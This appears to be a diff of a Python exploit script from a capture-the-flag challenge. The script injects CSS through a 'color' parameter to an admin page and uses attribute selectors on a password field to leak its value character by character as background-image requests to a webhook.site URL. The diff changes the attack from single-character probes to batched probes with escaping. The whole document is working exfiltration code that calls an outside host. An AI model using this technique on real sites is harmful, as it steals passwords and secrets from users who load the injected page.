@@ -1,55 +1,59 @@
 import requests
 import time
 import string
+from urllib.parse import unquote
 
 TARGET = "http://10.0.118.48:7777/admin"
 VIEW_URL = "http://10.0.118.48:7777/view"
 WEBHOOK_TOKEN = "4fee6e38-c18a-4ca9-b2ba-78f3e17bf9d2"
-
 WEBHOOK_API = f"https://webhook.site/token/{WEBHOOK_TOKEN}/requests"
-PAYLOAD = "blue;}input[type=\"password\"][value^=\"{}\"] {{background-image: url(\"https://webhook.site/{}/{}/\");}}"
 
 charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_@"
-
 prefix = ""
 
-def clear_webhook():
-    requests.delete(f"https://webhook.site/token/{WEBHOOK_TOKEN}/requests")
-
-def check_webhook():
+def get_urls():
     r = requests.get(WEBHOOK_API)
-    data = r.json()
-    if data["data"]:
-        return True
-    return False
+    return [req["url"] for req in r.json()["data"]]
 
-def send_payload(test_prefix):
-    payload = PAYLOAD.format(test_prefix, WEBHOOK_TOKEN, test_prefix)
+def css_escape(s):
+    return (
+        s.replace("\\", "\\\\")
+         .replace('"', '\\"')
+         .replace("{", "\\{")
+         .replace("}", "\\}")
+    )
 
-    data = {
+def send_batch(prefix):
+    css = "blue;}\n"
+    for ch in charset:
+        test = prefix + ch
+        safe = css_escape(test)
+
+        css += f'''input[type="password"][value^="{safe}"] {{
+background-image: url("https://webhook.site/{WEBHOOK_TOKEN}/{test}");
+}}\n'''
+
+    requests.post(TARGET, data={
         "url": VIEW_URL,
-        "color": payload
-    }
-
-    requests.post(TARGET, data=data)
+        "color": css
+    })
 
 while True:
-    found = False
+    print(f"[*] Current prefix: {prefix}")
+    send_batch(prefix)
+    time.sleep(3)
+    urls = get_urls()
+    best = ""
     for ch in charset:
-        test_prefix = prefix + ch
-        print(f"[+] Trying: {test_prefix}")
-
-        clear_webhook()
-        send_payload(test_prefix)
-
-        time.sleep(2)  # wait for admin visit
-
-        if check_webhook():
-            print(f"[Y] Found: {test_prefix}")
-            prefix = test_prefix
-            found = True
-            break
-
-    if not found:
-        print("[!] No more characters found. Final flag:", prefix)
+        candidate = prefix + ch
+        for url in urls:
+            decoded = unquote(url)
+            if f"/{candidate}" in decoded:
+                if len(candidate) > len(best):
+                    best = candidate
+    if best:
+        prefix = best
+        print(f"[+] Found: {prefix}\n")
+    else:
+        print("\n[!] Final flag:", prefix)
         break
